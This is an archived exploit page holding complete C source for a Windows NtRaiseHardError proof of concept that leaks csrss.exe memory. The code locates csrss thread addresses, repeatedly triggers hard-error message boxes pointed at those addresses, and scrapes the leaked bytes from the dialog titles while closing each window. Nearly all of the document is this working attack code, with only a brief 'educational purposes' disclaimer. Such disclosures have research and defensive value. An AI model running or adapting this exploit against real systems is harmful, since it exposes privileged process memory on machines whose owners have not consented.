<html><head><title>MS Windows NtRaiseHardError Csrss.exe Memory Disclosure Exploit</title></head><pre>/////////////////////////////////////////
/////////////////////////////////////////
///// Microsoft Windows NtRaiseHardError 
///// Csrss.exe memory disclosure  
/////////////////////////////////////////
///// Ruben Santamarta  
///// ruben at reversemode dot com
///// www.reversemode.com 
/////////////////////////////////////////
///// 12.27.2006
///// For educational purposes ONLY
///// Compiled using gcc (Dev-C++)
////////////////////////////////////////

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;winbase.h&gt;
#include &lt;ntsecapi.h&gt;


#define UNICODE
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;= 0)
#define STATUS_SUCCESS              ((NTSTATUS) 0x00000000)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS) 0xC0000004)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS) 0xC000000D)
#define SystemProcessesAndThreadsInformation	5
#define NTAPI	__stdcall

int gLen=1;


typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
                                    ULONG,
                                    ULONG,
                                    PULONG,
                                    UINT,
                                    PULONG);     
  

typedef LONG NTSTATUS;
typedef LONG	KPRIORITY;

typedef struct _CLIENT_ID {
    DWORD	    UniqueProcess;
    DWORD	    UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _VM_COUNTERS {
    SIZE_T	    PeakVirtualSize;
    SIZE_T	    VirtualSize;
    ULONG	    PageFaultCount;
    SIZE_T	    PeakWorkingSetSize;
    SIZE_T	    WorkingSetSize;
    SIZE_T	    QuotaPeakPagedPoolUsage;
    SIZE_T	    QuotaPagedPoolUsage;
    SIZE_T	    QuotaPeakNonPagedPoolUsage;
    SIZE_T	    QuotaNonPagedPoolUsage;
    SIZE_T	    PagefileUsage;
    SIZE_T	    PeakPagefileUsage;
} VM_COUNTERS;


typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER   KernelTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   CreateTime;
    ULONG			WaitTime;
    PVOID			StartAddress;
    CLIENT_ID	    ClientId;
    KPRIORITY	    Priority;
    KPRIORITY	    BasePriority;
    ULONG			ContextSwitchCount;
    LONG			State;
    LONG			WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;



typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG			NextEntryDelta;
    ULONG			ThreadCount;
    ULONG			Reserved1[6];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ProcessName;
    KPRIORITY	    BasePriority;
    ULONG			ProcessId;
    ULONG			InheritedFromProcessId;
    ULONG			HandleCount;
    ULONG			Reserved2[2];
    VM_COUNTERS	    VmCounters;
    IO_COUNTERS	    IoCounters;
    SYSTEM_THREAD_INFORMATION  Threads[5];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
 
  

typedef DWORD (WINAPI* PQUERYSYSTEM)(UINT, PVOID, DWORD,PDWORD);


ULONG GetCsrssThread()
{
	ULONG cbBuffer = 0x5000;
	ULONG tPointer;
    LPVOID pBuffer = NULL;
    NTSTATUS Status;
	PCWSTR pszProcessName;
	DWORD  junk;
	ULONG ThreadCount;
	int i=0,b=0;

	PQUERYSYSTEM NtQuerySystemInformation;
	PSYSTEM_THREAD_INFORMATION pThreads;
	PSYSTEM_PROCESS_INFORMATION pInfo ;

	NtQuerySystemInformation = (PQUERYSYSTEM) GetProcAddress( LoadLibrary( &quot;ntdll.dll&quot; ),
											   &quot;NtQuerySystemInformation&quot; );

	
	do
    {
        pBuffer = malloc(cbBuffer);
        if (pBuffer == NULL)
        {
            printf((&quot;Not enough memory\n&quot;));
           break;
        }

        Status = NtQuerySystemInformation(
                    SystemProcessesAndThreadsInformation,
                    pBuffer, cbBuffer, NULL);

        if (Status == STATUS_INFO_LENGTH_MISMATCH)
        {
            free(pBuffer);
            cbBuffer *= 2;
        }
        else if (!NT_SUCCESS(Status))
        {
			printf(&quot;NtQuerySystemInformation Error! &quot;);
            free(pBuffer);
        }
		
    }   while (Status == STATUS_INFO_LENGTH_MISMATCH);


	pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;

    for (;;)
    {
		

		if (pInfo-&gt;NextEntryDelta == 0)
			break;
		if(pInfo-&gt;ProcessName.Buffer!=NULL &amp;&amp;
        !wcsicmp(pInfo-&gt;ProcessName.Buffer,L&quot;csrss.exe&quot;))
		{
       
			printf(&quot;\n[%ws]  \n\n&quot;, pInfo-&gt;ProcessName.Buffer);
			printf(&quot;5 addresses for testing purposes\n\n&quot;);
	       for(b=0;b&lt;5;b++)
           {
             printf(&quot;Thread %d -&gt; 0x%x\n&quot;,b,pInfo-&gt;Threads[b].StartAddress);	
           } 
		   tPointer=(ULONG)pInfo-&gt;Threads[1].StartAddress;
        }
		pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo)
						+ pInfo-&gt;NextEntryDelta);
    }

    free(pBuffer);
    return tPointer;
}         

VOID WINAPI ReadBox( LPVOID param ) 
{ 

	HWND hWindow,hButton,hText;
	int i=0,b=0;
	int gTemp;
	char lpTitle[300];
	char lpText[300];
	char lpBuff[500];
	 
	for (;;)
	{
	
		lpText[0]=(BYTE)&quot;&quot;;
       Sleep(800);
		hWindow = FindWindow(&quot;#32770&quot;,NULL);
		if(hWindow != NULL)
		{
			GetWindowText(hWindow,(LPSTR)&amp;lpTitle,250);
		    
			hText=FindWindowEx(hWindow,0,&quot;static&quot;,0);
		
			GetWindowText(hText,(LPSTR)&amp;lpText,250);
			hText=GetNextWindow(hText,GW_HWNDNEXT);
			
            GetWindowText(hText,(LPSTR)&amp;lpText,250);
		    gTemp = strlen(lpTitle);
            
            if ( gTemp&gt;1 ) gLen = gTemp;
            else gLen = 1;
			
            for(i = 0; i &lt; gTemp; i++)   printf(&quot;%.2X&quot;,(BYTE)lpTitle[i]);
         
    		   
		    SendMessage(hWindow,WM_CLOSE,0,0);
			
            ZeroMemory((LPVOID)lpTitle,250);
			ZeroMemory((LPVOID)lpText,250);
			ZeroMemory((LPVOID)lpBuff,300);
		}

	}
}



                          
int main()
{
    
   UNICODE_STRING uStr={5,5,L&quot;fun!&quot;};
   ULONG retValue,args[]={0,0,&amp;uStr};
   ULONG csAddr;
   PNTRAISE NtRaiseHardError;    
   int i=0;
    
    system(&quot;cls&quot;);
    printf(&quot;##########################################\n&quot;);
    printf(&quot;### Microsoft Windows NtRaiseHardError ###\n&quot;);
    printf(&quot;#####  Csrss.exe memory disclosure  ######\n&quot;);
    printf(&quot;@@@@@  Xmas Exploit   -   ho ho ho! @@@@@@\n&quot;);
    printf(&quot;## Ruben Santamarta www.reversemode.com ##\n&quot;);
    printf(&quot;##########################################\n\n&quot;);
   
    NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;),
                                               &quot;NtRaiseHardError&quot;);  
   	
    csAddr=GetCsrssThread();
    
    args[0]=csAddr;
  	args[1]=csAddr;
   	printf(&quot;\n[+] Capturing Messages \n&quot;); 
          
    CreateThread( NULL,              
				  0,                  
				 (LPTHREAD_START_ROUTINE)ReadBox,        
				  0,             
				  0,                 
				 NULL); 
  
    
				 
	printf(&quot;\n[+] Now reading at: [0x%p] - Thread 1\n\n&quot;,csAddr);		 
     
   for(;;)
   {
    printf(&quot;Reading bytes at [0x%p] : &quot;,args[0]);
    NtRaiseHardError(0x50000018,3,4,args,1,&amp;retValue);
    
    if(retValue &amp;&amp; gLen&lt;=1)          printf(&quot;00\n&quot;);
    else printf(&quot;\n&quot;);
   
    args[0]+=gLen;
    args[1]+=gLen; 
    }
}

// milw0rm.com [2006-12-27]</pre></html>